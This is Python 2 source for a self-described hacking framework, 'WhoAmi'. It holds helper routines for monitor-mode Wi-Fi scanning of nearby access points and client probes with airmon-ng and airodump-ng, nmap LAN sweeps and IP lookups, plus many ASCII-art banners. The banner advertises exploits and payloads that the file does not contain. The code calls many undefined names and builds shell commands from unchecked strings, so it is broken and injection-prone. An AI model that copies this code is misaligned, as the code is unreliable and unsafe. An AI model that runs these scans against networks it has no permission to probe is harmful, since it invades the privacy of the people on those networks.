#!/usr/bin/python2
import requests
import time
import sys
import mechanize
import os
import random
import socket
import cookielib
import subprocess
import commands
import select
import zipfile
import poplib
import shodan
from urllib2 import *
from lib.rarfile.RARfile import *

import fcntl        ,struct   ,readline,rlcompleter,subprocess,webbrowser
import threading    ,StringIO ,httplib ,commands   ,random ,re , json
import logging      ,urllib   ,socket  ,time       ,sys

def Space():
 print ""
#FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF{fantion}FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
class NET:

	def CheckConnectionHost(self, defaulthost, defaultport, timeout):
		try :
			redTEST=socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
			redTEST.settimeout(timeout) 
			redTEST.connect((defaulthost, int(defaultport))) 
			redTEST.close()
			return True
		except: return False
		return False

	def StartMonitorMode(self,interface):
		state=commands.getoutput("airmon-ng start "+interface)
		if state.find("monitor mode enabled"):return True
		return False

	def InterfaceSupportAPMode(self):
		output = commands.getoutput('iw list | grep "* AP"')
		if len(output) > 0 : return True
		prk.err("You device not support AP mode.")
		return False

	def GetLocalIp(self):
		SocCKet = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		try: 
			SocCKet.connect(("google.com",80))
			if True:
				IP_Address=SocCKet.getsockname()[0]
				SocCKet.close()
				return IP_Address
		except:
			SocCKet.close()
			return "NULL"

	def GetPublicIp(self):
		try:	
		    site = urllib.urlopen("http://checkip.dyndns.org/").read()
		    grab = re.findall('([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', site)
		    address = grab[0]
		    return address
		except:
			return "NULL"

	def GetInterfacesOnSystem(self):
		Interfaces=commands.getoutput("netstat -i | awk '{print $1}'")
		Interfaces=Interfaces.replace("\n",",")
		Interfaces=Interfaces.replace("Kernel,Iface,","")
		Interfaces=Interfaces.split(",")
		if len(Interfaces) >= 0:
			return Interfaces
		return "NULL"

	def CheckIfExistInterface(self,device):
		devices=commands.getoutput("netstat -i | awk '{print $1}'")
		devices=devices.split("\n")
		for interface in devices:
			if device == interface : return True
		NoDeviceFound(device)
		return False

	def GetMonitorInterfaces(self):
		Monitor=commands.getoutput("airmon-ng | grep 'mon' | awk '{print $2}'")
		Monitor=Monitor.split("\n")
		if len(Monitor) >= 0:
			return Monitor
		return "NULL"


	def GetLanIps(self,output):
		test=isConect()
		count=0
		if test!=False:
			array_ip=[]
			commands.getoutput('nmap -sn '+test+'/24 -oX tmp/ips.xml > null')
			xmldoc = minidom.parse('tmp/ips.xml')
			itemlist = xmldoc.getElementsByTagName('address')
			for s in itemlist:
			    ip=s.attributes['addr'].value
			    if ip!=test:
			    	array_ip.append(ip)

		if output==1 and test!=False:
			for ip in array_ip:
				
				if ip.find(":") <= 0 :
					mac=ip
					if get_gateway(2)==mac:
						mac+="]["+colors.B+"GATEWAY"+colors.W
				else:
					count=count+1
					print " [ "+str(count),"] Host's up  : ["+mac+"]["+ip+"]"
			commands.getoutput('rm tmp/ips.xml > null')
		else:
			return False

	def GetGateway(self):
		ip_r_l=subprocess.Popen("ip r l",shell=True,stdout=subprocess.PIPE).communicate()[0]
		s = StringIO.StringIO(ip_r_l)
		for line in s:
			if "default" in line:
				gateway = re.search(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b',line).group(0)
				return gateway
		return "NULL"

	def AmIConectedToANetwork(self):
		ip_r_l=subprocess.Popen("ip r l",shell=True,stdout=subprocess.PIPE).communicate()[0]
		s = StringIO.StringIO(ip_r_l)
		for line in s:
			if "default" in line:
				return True
		prk.err("you not is connected to a network.\n")
		return False


	def GetMacAddress(self):
		if self.AmIConectedToANetwork()!=False:
		    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
		    for maca in my_macs:
		        if(maca != "00:00:00:00:00:00"):
		            return maca
		return "NULL"

	def CheckWebStatus(self,host, port, filerequest):
		connection = httplib.HTTPConnection(host,port)
		connection.request("GET", "/"+filerequest)
		response = connection.getresponse()
		code = response.status
		description = ["unknowk","unknowk"]
		if code == 200 : description = [ "OK"                                       , "Suf" ]
		if code == 201 : description = [ "Created"                                  , "Suf" ]
		if code == 202 : description = [ "Accepted"                                 , "Suf" ]
		if code == 203 : description = [ "Non/Authoritative Information (HTTP/1.1)" , "Suf" ]
		if code == 204 : description = [ "No Content"                               , "Suf" ]
		if code == 205 : description = [ "Reset Content"                            , "Suf" ]
		if code == 206 : description = [ "Partial Content"                          , "Suf" ]
		if code == 207 : description = [ "Multi/Status (Multi/Status, WebDAV)"      , "Suf" ]
		if code == 208 : description = [ "Already Reported (WebDAV)"                , "Suf" ]
		if code == 300 : description = [ "Multiple Choices"                         , "Inf:Redirection" ]
		if code == 301 : description = [ "Moved Permanently"                        , "Inf:Redirection" ]
		if code == 302 : description = [ "Found"                                    , "Inf:Redirection" ]
		if code == 303 : description = [ "See Other (from HTTP/1.1)"                , "Inf:Redirection" ]
		if code == 304 : description = [ "Not Modified"                             , "Inf:Redirection" ]
		if code == 305 : description = [ "Use Proxy (desde HTTP/1.1)"               , "Inf:Redirection" ]
		if code == 306 : description = [ "Switch Proxy"                             , "Inf:Redirection" ]
		if code == 307 : description = [ "Temporary Redirect (desde HTTP/1.1)"      , "Inf:Redirection" ]
		if code == 308 : description = [ "Permanent Redirect"                       , "Inf:Redirection" ]                
		if code == 400 : description = [ "Bad Request"                              , "Inf:Redirection" ]
		if code == 401 : description = [ "Unauthorized"                             , "Err:Client" ]
		if code == 402 : description = [ "Payment Required"                         , "Err:Client" ]
		if code == 403 : description = [ "Forbidden"                                , "Err:Client" ]
		if code == 404 : description = [ "Not Found"                                , "Err:Client" ]
		if code == 405 : description = [ "Method Not Allowed"                       , "Err:Client" ]
		if code == 406 : description = [ "Not Acceptable"                           , "Err:Client" ]
		if code == 407 : description = [ "Proxy Authentication Required"            , "Err:Client" ]
		if code == 408 : description = [ "Request Timeout"                          , "Err:Client" ]
		if code == 409 : description = [ "Conflict"                                 , "Err:Client" ]
		if code == 410 : description = [ "Gone"                                     , "Err:Client" ]
		if code == 411 : description = [ "Length Required"                          , "Err:Client" ]
		if code == 412 : description = [ "Precondition Failed"                      , "Err:Client" ]
		if code == 413 : description = [ "Request Entity Too Large"                 , "Err:Client" ]
		if code == 414 : description = [ "Request/URI Too Long"                     , "Err:Client" ]
		if code == 415 : description = [ "Unsupported Media Type"                   , "Err:Client" ]
		if code == 416 : description = [ "Requested Range Not Satisfiable"          , "Err:Client" ]
		if code == 417 : description = [ "Expectation Failed"                       , "Err:Client" ]
		if code == 418 : description = [ "I'm a teapot"                             , "Err:Client" ]
		if code == 422 : description = [ "Unprocessable Entity (WebDAV / RFC 4918)" , "Err:Client" ]
		if code == 423 : description = [ "Locked (WebDAV / RFC 4918)"               , "Err:Client" ]
		if code == 424 : description = [ "Failed Dependency (WebDAV) (RFC 4918)"    , "Err:Client" ]
		if code == 425 : description = [ "Unassigned"                               , "Err:Client" ]
		if code == 426 : description = [ "Upgrade Required (RFC 7231)"              , "Err:Client" ]
		if code == 428 : description = [ "Precondition Required"                    , "Err:Client" ]
		if code == 429 : description = [ "Too Many Requests"                        , "Err:Client" ]
		if code == 431 : description = [ "Request Header Fileds Too Large)"         , "Err:Client" ]
		if code == 451 : description = [ "Unavailable for Legal Reasons"            , "Err:Client" ]
		if code == 500 : description = [ "Internal Server Error"                    , "Err:Server" ]
		if code == 501 : description = [ "Not Implemented"                          , "Err:Server" ]
		if code == 502 : description = [ "Bad Gateway"                              , "Err:Server" ]
		if code == 503 : description = [ "Service Unavailable"                      , "Err:Server" ]
		if code == 504 : description = [ "Gateway Timeout"                          , "Err:Server" ]
		if code == 505 : description = [ "HTTP Version Not Supported"               , "Err:Server" ]
		if code == 506 : description = [ "Variant Also Negotiates (RFC 2295)"       , "Err:Server" ]
		if code == 507 : description = [ "Insufficient Storage (WebDAV / RFC 4918)" , "Err:Server" ]
		if code == 508 : description = [ "Loop Detected (WebDAV)"                   , "Err:Server" ]
		if code == 510 : description = [ "Not Extended (RFC 2774)"                  , "Err:Server" ]
		if code == 511 : description = [ "Network Authentication Required"          , "Err:Server" ]
		if (description[1]=="Err:Server"):
			prk.err("Connection : "+description[0])
			return False
		if (description[1]=="Err:Client"):
			prk.war("Connection : "+description[0])
			return False
		if (description[1]=="Suf")       :
			prk.suff("Connection : "+description[0])
			return True


class UTIL:
	def sRegister(self,init,goal):
		saveRegister(init,goal)

	def CheckProjectInstalled(self,project):
		status=subprocess.call("if ! hash "+project+" 2>/dev/null; then echp 3 >/dev/null 2>&1 ; fi", shell=True)
		if status==0:
			return True
		else:
			return False

	def CheckIfIsMacAddress(self,mac):
		if re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", mac.lower()): return True
		return False

class GRAPHICAL:
	def CreateTable(self,table):
		MakeTable(table)

class COM:
	def ListDevicesConnectADB(self):
		try:
			NumberDevice=0
			LIST = ""
			for d in adb_commands.AdbCommands.Devices():
				NumberDevice+=1
				LIST += (' %s) %s\t device\t%s' % (NumberDevice, d.serial_number, ','.join(str(p) for p in d.port_path)))
			return LIST
		except:N=2

class WIFI:
	def get_aps(mon,timeout):
		commands.getoutput('rm '+FOLDER_KATANA+'tmp/*.netxml')
		prk.inf("Scanning Access Points in Interface '"+mon+"', Please wait "+str(timeout)+"seg")
		Subprocess("airodump-ng "+mon+" -w '"+FOLDER_KATANA+"tmp/ktf.wifi' --wps --output-format netxml --write-interval "+str(timeout))
		time.sleep(timeout+1)
		APCOUNTER    = 0
		CLCOUNTER    = 0
		ESSIDs       = []
		BSSIDs       = []
		MANUs        = []
		CHANNELs     = []
		ENCRYPTAIONs = []
		PWRs         = []
		CLIENTMACs   = []
		CLIENTMANs   = []
		CLIENTESSs   = []
		tree = ET.parse(FOLDER_KATANA+'tmp/ktf.wifi-01.kismet.netxml')
		root = tree.getroot()
		try:
			Space()
			b =  [["#","MAC","CH","PWR","ENCRYPTION","VENDOR","ESSID"]]

			for network in root.findall('wireless-network'):
				if network.get('type')=="infrastructure":
					for essid in network.findall('SSID'):

						APCOUNTER += 1

						if essid.find('essid') is not None:
							ESSIDs.append(essid.find('essid').text)
						else:
							ESSIDs.append("NULL")

						if essid.find('encryption') is not None:
							ENCRYPTAIONs.append(essid.find('encryption').text)
						else:
							ENCRYPTAIONs.append("NULL")

			for network in root.findall('wireless-network'):
				if network.get('type')=="infrastructure":	
					BSSIDs.append(network.find('BSSID').text)
					MANUs.append(network.find('manuf').text)
					CHANNELs.append(network.find('channel').text)

			for network in root.findall('wireless-network'):
				if network.get('type')=="infrastructure":
					for essid in network.findall('snr-info'):
						PWRs.append(essid.find('last_signal_rssi').text)

			for network in root.findall('wireless-network'):
				if network.get('type')=="probe":
					for probe in network.findall('wireless-client'):
						CLCOUNTER+=1
						CLIENTMACs.append(probe.find('client-mac').text)
						CLIENTMANs.append(probe.find('client-manuf').text)

						for essid in probe.findall('SSID'):
							if essid.find('ssid') is not None:
								CLIENTESSs.append(essid.find('ssid').text)
							else:
								CLIENTESSs.append("NULL")
			LIST=0
			while LIST < APCOUNTER:
				b += [[str(LIST),str(BSSIDs[LIST]),str(CHANNELs[LIST]),str(PWRs[LIST]),str(ENCRYPTAIONs[LIST]),str(MANUs[LIST]),str(ESSIDs[LIST])]]
				LIST+=1

			b +=  [["","","","","","",""]]
			b +=  [["#","MAC","","","","VENDOR","PROBE"]]
			b +=  [["","","","","","",""]]


			LIST=0
			while LIST < CLCOUNTER:
				b += [[str(LIST),str(CLIENTMACs[LIST]),"","","",str(CLIENTMANs[LIST]),str(CLIENTESSs[LIST])]]
				LIST+=1

			Maquetar(b)
			commands.getoutput('killall airodump-ng')
		except:FAIL=1292
	

class SYSTEM:
	def Command_exe(self,msg,cmd,std):
		i = "\033[1mSTATUS"+colors[0]+":[Processing]"
		stdout.write(" " + information + " " + msg + " %s" % i)
		stdout.flush()
		if std:status_1=subprocess.call(cmd, shell=True)
		else  :status_1=subprocess.call(cmd+' >/dev/null 2>&1', shell=True)
		if status_1==0:
			i = "[\033[1m"+colors[2]+"OK"+colors[0]+"]"+colors[0]
		else:
			i = "["+colors[1]+"\033[1mERROR"+colors[0]+"]"+colors[0]+"["+colors[3]+"\033[1mWARNING"+colors[0]+"]"

		stdout.write("\r" + " " + information + " " + msg +" STATUS:%s                      \r" % i)
		stdout.write("     |\n")
		
	def Rtask(self,process):
		xtem="" 
		if XTERM_OPTION:xtem="xterm -e "
		commands.getoutput(xtem+process)

	def Subprocess(self,process):
		Hire=threading.Thread(target=self.Rtask, args=(process,))  
		Hire.start()

	def KillProcess(self,process):
		commands.getoutput("killall "+process)

class WEB:
	def RamdonAgent(self):
		global NUMBER_AGENTS,File_Agent_Open
		NUMBER_AGENTS=0
		if File_Agent_Open==False:
			with open(AGENTS_BROWSER,'r') as AGENT_LIST:
				for AGENT in AGENT_LIST:
					NUMBER_AGENTS=1+NUMBER_AGENTS
					AGENT_ARRAY.append(AGENT.replace("\n",""))
		File_Agent_Open=True
		Generate = 0
		Generate = random.randint(0, NUMBER_AGENTS)
		return AGENT_ARRAY[Generate]


### API EXECUTE FUNCTION ####################################################################################################
def Executefunction(query):
	NET_API = NET()
	WIFE_API= WIFI()

	try:

		if query[len("f::"):len("get_aps")+len("f::")] == "get_aps": 
			query = query[len("f::")+len("get_aps"):].replace("(","").replace(")","").split(",")
			WIFE_API.get_aps(str(query[0]),int(query[1]))

		elif query[len("f::"):len("start_monitor")+len("f::")] == "start_monitor":
			query = query[len("f::")+len("start_monitor"):].replace("(","").replace(")","").split(",")
			if NET_API.StartMonitorMode(query[0]):prks.suff(str(query[0])+" now is in monitor mode.")
			else:NoDeviceFound(query[0]) 

		elif query[len("f::"):len("get_interfaces")+len("f::")]    == "get_interfaces":    print " ",NET_API.GetInterfacesOnSystem()
		elif query[len("f::"):len("get_monitors_mode")+len("f::")] == "get_monitors_mode": print " ",NET_API.GetMonitorInterfaces()
		elif query[len("f::"):len("get_local_ip")+len("f::")]      == "get_local_ip":      print " ",NET_API.GetLocalIp()
		elif query[len("f::"):len("get_external_ip")+len("f::")]   == "get_external_ip":   print " ",NET_API.GetPublicIp()
		elif query[len("f::"):len("get_gateway")+len("f::")]       == "get_gateway":       print " ",NET_API.GetGateway()

		else:functionNotFound()                                                                                 
	except Exception:print " "+warning+" Check Again your Functions command."
##############################################################################################################################






NET       = NET()
UTIL      = UTIL()
GRAPHICAL = GRAPHICAL()
COM       = COM()
SYSTEM    = SYSTEM()
WEB       = WEB()

#FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFf
#########{colors}################
basic_green 	=	"\033[0;32m"#
green			=	"\033[1;32m"#
green_underline	=	"\033[4;32m"#
basic_yellow	=	"\033[0;33m"#
yellow 			=	"\033[1;33m"#
white			=	"\033[0;37m"#
whiteb			=	"\033[1;37m"#
basic_red		=	"\033[0;31m"#
red				=	"\033[1;31m"#
cyan			=	"\033[1;36m"#
basic_cyan		=	"\033[0;36m"#
blue			=	"\033[1;34m"#
basic_blue		=	"\033[0;34m"#
light_blue		=	"\033[0;94m"#
blue_underline	=	"\033[4;34m"#
default			=	"\033[0m"   #
underline		=	"\033[4;32m"#
r               =   "\033[1;31m"#
g               =   "\033[1;32m"#
y               =   "\033[1;33m"#
b               =   "\033[1;34m"#
c               =   "\033[1;36m"#
#################################



def exit():
  print blue+"\n[*]"+default+" { exit } Detected, Trying To Exit ..."
  time.sleep(0.5)
  print blue+"[*]"+default+"Good bay"
  sys.exit()
#22222222222222222222222222222222222222222222222222222222{banner}22222222222222222222222222222222222222222222222222222222222222222222222
def sem():
 print red + '   }--------------{+} programmer [Amerr] {+}----------------{'+default
 print red + '   }--------{+} GitHub.com/Amerlaceset/WhoAmi {+}-----------{'+default
 print"       =["+basic_yellow+" WhoAmi V {   1.0.0   }                       "+default+"]"
 print"+ -- --=[ 10  exploits - 03  auxiliary - 00 network    ]"
 print"+ -- --=[ 11  payloads - 08  wireless  - 05 amerr      ]"
 print"+ -- --=[ 01  spam     - 02  communication             ]"
 print""
def banner_1():
  print default+"                   mM@@MM@@MM@@MM@@MM@@MM@@@MMMMM@@@@Mm                     "
  print "       ||========mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm===========||             "  
  print "       ||        @MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm         ||       "
  print "       ||        MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM@         ||       "
  print "       ||        @@MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM         ||       "
  print "       ||        @MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM@         ||       "
  print "       ||        @@MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM         ||       "
  print "       ||        @MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM@         ||       "
  print "       ||========@MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM=========||       "
  print "       ||         /TT\\mMMMMMMMMMMFRAMEWORKMMMMMMMMMMMMm           ||       "
  print "       ||        (____)@MM@@MM@@MM@@MMMMMM@@MM@@Mm                ||       "
  print "       ||        |# W |                                           ||       "
  print "       ||        |# A |                                           ||       "
  print "       ||        |#_F_|                                           ||       "
  print "       ||        |_  _|                                           ||           "    
  print "       ||        /|__|\\                                           ||       "
  print "       ||       /__\/__\\ The Hacking Framework                    ||       "
  print "                 ()  ()"
  sem()
  
def banner_2():    
  print default+" -----+-----+-----+-----+-----+north+-----+-----+-----+-----+-----+-----        "
  print "           , _-\','|~\~      ~/      ;-'_   _-'     ,;_;_,    ~~-        "
  print "  /~~-\_/-'~'--' \          ,'      /  / ~|-_\_/~/~      ~~--~~~~'--_        "
  print "  /                         ,'    , '|,'|~                   ._/-, /~        "
  print "  ~/-'~\_,               . '      ,\ /'~                /    /_  /~        "
  print "         '|        '',\~|\       _\~     ,_  ,               /|        "
  print "          '\        /'~          |_/~\\,-,~  \          ,_,/ |        "
  print "           |       /            ._-~'\_ _~|              \ ) /        "
  print "            \   __-\           '/  "+basic_yellow+"WAF"+default+" ~ |\  \_          /  ~        "
  print "             '\ |,  ~-_       '/           |  /\  \~ ,        "
  print "               ~-_'  _;       '\           '-,   \,' /\/  |        "
  print "                 '\_,~'\_       \_ _,       /'    '  |, /|'        "
  print "                   /     \_       ~ |      /         \  ~'; -,_.        "
  print "                   |       ~\        |    |  ,        '-_, ,; ~ ~\\        "
  print "                    \,      /        \    / /|            ,-, ,   -,        "
  print "                     |    ,/          |  |' |/          ,-   ~ \   '.        "
  print "                     |   ,/           \ ,/              \       |        "
  print "                    /    |             ~                 -~~-, /   _        "
  print "                    |  ,-'                                    ~    /        "
  print "                    / ,'                                      ~        "
  print "                    ',|           "
  print "                      ~'         "
  print " -----+-----+-----+-----+-----+south+-----+-----+-----+-----+-----+----- "
  sem()
def banner_3():              
  print default+"                             _         "   
  print "                           _|  \______________________________________   "   
  print "                          - ______        ________________          \_`,  "   
  print "                        -(_______   "+basic_yellow+"WAF"+default+"      -=    -=        2933       ) "   
  print "                                 `--------=============----------------`  "   
  print "                                           -   -         "   
  print "                                                    -   -         "   
  print "                                           `   . .  -  -         "   
  print "                                     .*` .* ;`*,`.,         "   
  print " Year-2020                       `, ,`.*.*. *         "     
  print " ________________________________*  * ` ^ *____________________________" 
  sem()
def banner_4():
  print default +"""                            _...----.                """
  print default +"""                          .'    .-'`                """
  print default +"""                        ,''--..;                 """
  print default +"""                       /       |                  """
  print default +"""               _______/________|_______               """
  print default +"""              `-----/// _\  /_ \\\-----`                  """
  print default +"""                .---./ / o\/o \ \.---.                  """
  print default +"""               <(_ /// \__/\__/ \\\ _)>   _.---.                  """
  print default +"""                '-. //    oo    \\ .-'  .'   .__`\                  """
  print default +"""             o    /// __..--..__ \\\   /       \`\|                  """
  print default +"""          o-'*'-o //| '\/\/\/\/' |\\  /         ; '                  """
  print default +"""          \*\|/*/   ;--. """"  .-;   |   _   _  |                  """
  print default +"""         .-'---'-. / \|||-....(|||`\ |  (o) (o) |                  """
  print default +"""        /         \ /\           /\|/           |                  """
  print default +"""        |  .---,  |/  \         /  ;  '         |                  """
  print default +"""        | / e e \ |    '.     .'   |   '-.       \                  """
  print default +"""         \|  ^  |/       '---'     |              \_                  """
  print default +"""         ()._-_.()     T R I C K   |     .._.----/` \                  """
  print default +"""        ,/\'._.'/\. '  .           |    /   ``"-/||\ \                  """
  print default +"""       / \/     \/ \     O R       |   |            `7,                  """
  print default +"""      |  ^^_____^^  |              | . /// _          |                  """
  print default +"""      |oOO`     `OOo|  T R E A T   ; |' / |_) _       |                  """
  print default +"""      \| '._____.' |/             /  \-|  |_)/ \ _    |                  """
  print default +"""       |::         | '.__     __,;    `|     \_// \   |                  """
  print default +"""       |::         |     `````   |     |        \_/  ;                  """
  print default +"""       |::         |             |      \           /                  """
  print default +"""       \::.        /_____________|       ``'--..___/                  """
  print default +"""        '._______.' '-|   |   |-'                 |                  """
  print default +"""          |_ | _|     |   |   |               __.-;                  """
  print default +"""          \  |  /     /-._|_.-\                    \                  """
  print default +"""           \_|_/     /`'-.|.-'`\                   /                  """
  print default +"""     """+basic_yellow+"WAF"+default+"""  /--T--\   /    .'.    \'-..____.---''''``                  """
  print default +"""         (__/ \__)  \____/  \___/                  """
  sem()
 
def banner_5():
  print default +""" ,                                                               ,              """
  print default +""" \'.                                                           .'/              """
  print default +"""  ),\                                                         /,(               """
  print default +""" /__\'.                                                     .'/__\              """
  print default +""" \  `'.'-.__                                           __.-'.'`  /              """
  print default +"""  `)   `'-. \                                         / .-'`   ('              """
  print default +"""  /   _.--'\ '.          ,               ,          .' /'--._   \              """
  print default +"""  |-'`      '. '-.__    / \             / \    __.-' .'      `'-|              """
  print default +"""  \         _.`'-.,_'-.|/\ \    _,_    / /\|.-'_,.-'`._         /              """
  print default +"""   `\    .-'       /'-.|| \ |.-"   "-.| / ||.-'\       '-.    /`              """
  print default +"""     )-'`        .'   :||  / -.\\ //.- \  ||:   '.        `'-(              """
  print default +"""    /          .'    / \\_ |  /o`^'o\  | _// \    '.          \              """
  print default +"""    \       .-'    .'   `--|  `"/ \"`  |--`   '.    '-.       /              """
  print default +"""     `)  _.'     .'    .--.; |\__"__/| ;.--.    '.     '._  ('              """
  print default +"""     /_.'     .-'  _.-'     \\ \/^\/ //     `-._  '-.     '._\              """
  print default +"""     \     .'`_.--'          \\     //          `--._`'.     /              """
  print default +"""      '-._' /`            _   \\-.-//   _            `\ '_.-'              """
  print default +"""          `<     _,..--''`|    \`"`/    |`''--..,_     >`              """
  print default +"""           _\  ``--..__   \     `'`     /   __..--``  /_              """
  print default +"""          /  '-.__     ``'-;    / \    ;-'``     __.-'  \              """
  print default +"""         |    _   ``''--..  \'-' | '-'/  ..--''``   _    |              """
  print default +"""         \     '-.       /   |/--|--\|   \       .-'     /              """
  print default +"""          '-._    '-._  /    |---|---|    \  _.-'    _.-'              """
  print default +"""              `'-._   '/ / / /---|---\ \ \ \'   _.-'`              """
  print default +"""                   '-./ / / / \`---`/ \ \ \ \.-'              """
  print default +"""                       `)` `  /'---'\  ` `(`              """
  print default +"""                 """+basic_yellow+"WAF"+default+"""  /`     |       |     `\              """
  print default +"""                     /  /  | |       | |  \  \              """
  print default +"""                 .--'  /   | '.     .' |   \  '--.              """
  print default +"""                /_____/|  / \._\   /_./ \  |\_____\              """
  print default +"""               (/      (/'     \) (/     `\)      \)              """
  sem()
 
def banner_6():
  print default +"""                        ,mmmmm,            ______     _________              """
  print default +"""                        @ooooo@,         / /. . \\   /./-----\.\              """
  print default +"""                        @0m0m0Q@        / /. . .`,\\>./,  ,  ,\.\              """
  print default +"""                        @0X00X@@       | |. . .  |:|\|   ,  ,  |.|              """
  print default +"""                     ____@0m00@_____   | | . . . |:|X| ,  ,  , |.|              """
  print default +"""                    @@@op(oboy)pop@@Ok | |. . .  |:|\|   ,  ,  |.|              """
  print default +"""                   @@@@opopopopop@@@p@@| | . . . |:|\| ,  ,  , |.|              """
  print default +"""                   @@o@@opopopo"""+basic_yellow+"WAF"+default+"""@@op@@,|. . .  |:|\|   ,  ,  |.|              """
  print default +"""                   @@o@@popopopopopop@o@@| . . . |:|X| ,  ,  , |.|              """
  print default +"""                    @@o@@mmmmmmgogogo@oo@|. . .  |:|\|   ,  ,  |.|              """
  print default +"""                     @@@@@@@mmm'ooo@|@oo@| . . . |:|\| ,  ,  , |.|              """
  print default +"""                      @oooooooOOOO@"  @o@|. . .  |:|\|   ,  ,  |.|              """
  print default +"""                      @OoOoO@OoOoO@   @@@| . . . |:|X| ,  ,  , |.|              """
  print default +"""                      @oooo@@@oooo@   @@@|. . . .|:|\|   ,  ,  |.|              """
  print default +"""                     .@@@o@@@@ooo@@  ,@@}| . . .//  \\_________/.|              """
  print default +"""                    .@@oo@@@@@@ooo@. "@@'|. . //     \==========/              """
  print default +"""                   .@ooooo@@@@@oooo@      \ //              """
  print default +"""                   @ooooO@' `@@ooo@|              """
  print default +"""                   @oooo@'   `@oooo@              """
  print default +"""                  @ooo@'     `oooo@|                    """
  print default +"""                  @oo@@'      `@oo@|                    """
  print default +"""                  @o@@|        @@o@,                         """
  print default +"""                  @@@@:        @@o@|                              """
  print default +"""                  @@@@:        @@o@|                        """
  print default +"""                  `@oo:        `@@@:              """
  print default +"""                  /@@@)        /@@@)              """
  print default +"""                (@@@@/       (@@@@/                        """
  sem()


                                                                                                
def banner_7():                                                                                
  print default+"                .-:::/-.`        "                                 
  print "               /:`     .:/               "                                          
  print "       .:::---:/-        -o::-`          "                                       
  print "      ./                  `  `:/         "                                 
  print "  `/::/`                       +`        "                        
  print " `o                           `o-`       "             
  print "  -/-----:::-                   .-/`     "          
  print "            .:::::+/`.:::::::::::::`     "   
  print "                  `...`                                                .:://`"   
  print "`.-::::::-`                                                        -:::.`  `/:"   
  print ".:::::--..-:::::-.`                                           .-:::`        `:o`"   
  print "       `.--:::--:---:::--`                                -:::-`     `---:::--` "   
  print "               ``.-::::::::::::-``                   `-:::.  ``-:::::-``  "   
  print "                        `.-::::////:::-.``.....` `-:::..-::::--`          "   
  print "                                `..::://s:..//--/s/:::-.`                 "   
  print "                             `...-:::/::oo:o.-+-:so+///:::--..``          "   
  print "                  `.:--:::::--..`.:-:::-.` o`::`  `.---:::::/+/:::::::--:.``  "   
  print "           .+o///-.```    `.:::::.`   `.://o/+////:``        ``.-:::::::----:/o:  "   
  print "             `.---::::::::-.      .:/+/-`         -/////:`              `.--:-  "   
  print "     -                         `/+/.           .-::/:-::+s+++-`    "   
  print "    oy:                      .+/`       `.-::://:`:`      ---/++/` "   
  print "    s:s  `:::.              +/`    .-:::-:-/-/` .-:`       `:.---o:"    
  print "    o:s.-/   :/            +/ `-:://--:::` :`/  `:.-      ``./-::`o/ "   
  print "    //.y+     /:  `.-://///::::. .-   ..:` :`/   :.:-.--...``  ``.-s/- "    
  print "    :+ y- `.://o///:.``    ::    :`   ..:` `:.-   /``   `........   `:o`"   
  print "    .o`h+//-.       ```...-o`    -` ``--.--.` :```:.  .:.`     .:  `--h. "   
  print "    -o/s///////o/////::-:h-s-    `:..`         ..``   .:`   `.-. .-.`+/ "   
  print "    o/y::     -/        +/`yy`                         `.---.  .+/:++. "    
  print "   `s++ /-   .+`       `s`s-.s.             .::::o`   `.o---o+//::.  "    
  print "   ++s`  :/-::`        /o+:  `/+o+/::--.---+:+ysoo/////:y`  s+     "    
  print "   so-                       -/+/::-...../o+o+/-        :+//s-+-  "    
  print "                            /:/:   `.---:o/+/o+-//`         `//-/` "      
  print "                         `-o+/o::/++//:/::::`  -/:+-          .+.+` `:++` "      
  print "                        .o::::----.`             :/:/   ``.----+++s+++: "     
  print "                                                 :+/o+so+///:::-...``"   
  print "                                                 -:-.` "    
  sem()                                                                              
                                                                                
                                                                                
                                                                                
                                                                                
def banner_8():                                                                                
  print default+"                                        "   
  print "                                   `-::-..:+/-`                           `"                   
  print "                                 `:/-`.-//:::+ys``                      `-`"                       
  print "                                `:--::..-:+ohNNm-                       `+//+:"                       
  print "                                /s+-`..sy+::ohy/:/:..-:-               `/+.`/o "                        
  print "                     ``-::-----:so:+ydhy.`/y:/.`.oo.` `:.           ``--/s/+/`"                      
  print "                      :ys:.-:/./dmNNh/ys `-/-/- `:s-   .:         .---`---`` "                       
  print "                      oos:   .-/ssyhN++y`::.:+.` -o-   `+      `-/-+:--` "                       
  print "                     `o//+` `-.   `.+:+s-..:+-  `-/`   -/    ./+:-+ddhy. "                      
  print "                      +:/o` .:`   `./.`:/:/os:..-+/::--/```-+o--+dNNd+. "                        
  print "                     `://+``:o:.`//::` `:-+d+++/o+::-//``:o+:-odNMmo.` "                           
  print "                      .:+o:...-+.y/ -/```.+:`+/`:    `:oo/-.+mNMMy:  "                           
  print "                     ``-:y`   -/.//-///.-///:/:`/` ``:+o-+:::NNm+` "                         
  print "                      .+.+-   -/`/.--`.s/. /`-:`+`./+/-o./:/+hy-`"                         
  print "                      -/`.o`  ./`+.   -o` ``.:/.s.+++y:.:.:/s/`` "                           
  print "                      -o-.. `.-: +-   `+ `:/+/:-oy+/mNs`o/y/`  "                          
  print "                      -s+.  `-o/ :/   `o:+/--/+o//oy/dy/+/+` ` "                          
  print "                      :s/`   `.: `s``-/s:.``-+//sdh+-os-`:: "                          
